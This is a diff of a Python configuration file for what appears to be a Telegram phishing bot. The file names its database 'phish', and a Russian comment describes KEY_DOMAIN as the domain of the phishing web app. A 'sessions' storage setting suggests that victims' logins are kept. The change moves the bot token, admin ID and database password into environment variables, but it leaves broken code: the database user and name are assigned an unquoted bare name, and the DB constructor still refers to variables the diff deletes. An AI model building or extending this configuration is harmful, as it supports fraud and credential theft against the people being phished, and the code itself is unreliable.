@@ -1,23 +1,25 @@
 from utils.postgres_db import DB
 import os
 
-db_host = 'localhost' #url базы данных
-db_port = 5432 # порт постгреса, по дефолту он запускается на этом порту, можно не трогать
-db_user = 'postgres' # логин
-dp_password = 'rootpass' # пароль 
-db_name = 'phish' # имя базы данных
+
+
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_ID = int(os.getenv("ADMIN_ID"))
+KEY_DOMAIN = os.getenv("KEY_DOMAIN")
+
+DP_PORT = 5432
+DB_USER = postgres
+DB_PASS = os.getenv("DB_PASS")
+DB_HOST = os.getenv("DB_HOST")
+DB_NAME = postgres
+
+DB_URL = f"postgresql+asyncpg://{DB_USER}:{DB_PASS}@{DB_HOST}/{DB_NAME}"
 
 db: DB = DB(
     db_host, db_port, db_user,
     dp_password, db_name
 )
 
-TOKEN = '' #сюда токен от бота
-DOMAIN = '' #для настройки вебхуков для бота, можно не трогать
-ADMIN = [] # впишите сюда ID корневых администраторов через запятую, например: [234234, 234235251, 12152]
-BOT_TIMEZONE = "Europe/Moscow"  # Time zone for bot
-
-KEY_DOMAIN = '' # домен вебаппа, то есть самого фишинга
 BAD_SYMBOLS = ['+', '(', '-', ')', ' '] # не трогать
 
 SESSIONS_STORAGE = "sessions"
